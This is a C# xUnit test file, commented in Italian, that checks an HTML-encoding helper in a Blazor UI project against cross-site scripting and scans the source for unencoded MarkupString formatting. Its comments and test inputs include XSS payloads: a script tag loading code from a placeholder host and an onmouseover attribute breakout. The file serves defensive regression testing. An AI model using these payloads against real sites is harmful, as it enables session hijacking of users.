using System.Text.RegularExpressions;
using Vipi.Ui;
using Xunit;

namespace Vipi.Ui.Tests;

/// <summary>
/// Le frasi dei <c>.resx</c> che portano markup (<c>&lt;b&gt;</c>, <c>&lt;code&gt;</c>, un collegamento) si
/// rendono come HTML, e i loro <c>{0}</c> ricevono valori che non abbiamo scritto noi.
///
/// <para><b>Perché serve (T-001, T-003 del 13 settembre 2026).</b> <c>(MarkupString)string.Format(frase, _app)</c>
/// su AppnPage metteva il callsign preso dalla QUERY dentro l'HTML così com'era: un link
/// <c>…/apps/vipi?app=&lt;SCRIPT SRC=//HOST/X.JS&gt;&lt;/SCRIPT&gt;</c> eseguiva codice con la sessione di chi lo
/// apriva, su una pagina pubblica in SSR. Sulla vista live lo stesso schema rendeva eseguibile il titolo di un
/// gruppo APP scritto da un Editor, davanti a un Admin. Undici posti, un solo schema.</para>
/// </summary>
public class FraseHtmlTests
{
    [Fact]
    public void Gli_argomenti_escono_encodati_e_il_markup_della_frase_resta()
    {
        var html = FraseHtml.Format("Nessun APP per <code>{0}</code>.", "<SCRIPT SRC=//HOST/X.JS></SCRIPT>").Value;

        Assert.Equal("Nessun APP per <code>&lt;SCRIPT SRC=//HOST/X.JS&gt;&lt;/SCRIPT&gt;</code>.", html);
    }

    [Fact]
    public void Un_argomento_non_esce_dall_attributo()
    {
        var html = FraseHtml.Format("<a href=\"{0}\">editor</a>", "/x?app=\" onmouseover=\"alert(1)").Value;

        Assert.DoesNotContain("\" onmouseover", html);
        Assert.Contains("&quot;", html);
    }

    [Fact]
    public void Un_argomento_null_diventa_vuoto()
    {
        Assert.Equal("<b></b>", FraseHtml.Format("<b>{0}</b>", (string?)null).Value);
    }

    /// <summary>
    /// La guardia: nessun <c>(MarkupString)string.Format(</c> nel markup. Una frase con argomenti che deve
    /// uscire come HTML passa da <see cref="FraseHtml.Format"/>, che encoda gli argomenti e lascia il markup
    /// della frase. Non si guarda caso per caso «questo valore è sicuro»: oggi lo è, domani arriva dalla query.
    /// </summary>
    [Fact]
    public void Nessuna_frase_con_argomenti_diventa_markup_senza_encodare()
    {
        var src = Path.Combine(Radice(), "src", "Vipi.Ui");
        var colpevoli = Directory.EnumerateFiles(src, "*.razor", SearchOption.AllDirectories)
            .Concat(Directory.EnumerateFiles(src, "*.cs", SearchOption.AllDirectories))
            .Where(f => !f.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}")
                     && !f.Contains($"{Path.DirectorySeparatorChar}bin{Path.DirectorySeparatorChar}"))
            .SelectMany(f => File.ReadLines(f).Select((riga, i) => (f, riga, i)))
            .Where(x => Regex.IsMatch(x.riga, @"MarkupString\)\s*(string\.Format|\$"")"))
            .Select(x => $"{Path.GetRelativePath(src, x.f)}:{x.i + 1}")
            .ToList();

        Assert.True(colpevoli.Count == 0,
            "Frasi con argomenti rese come markup senza encodare (usa FraseHtml.Format):\n" + string.Join("\n", colpevoli));
    }

    private static string Radice()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (Directory.Exists(Path.Combine(dir.FullName, "src", "Vipi.Ui"))) return dir.FullName;
            dir = dir.Parent;
        }
        throw new DirectoryNotFoundException("src/Vipi.Ui non trovato risalendo da " + AppContext.BaseDirectory);
    }
}
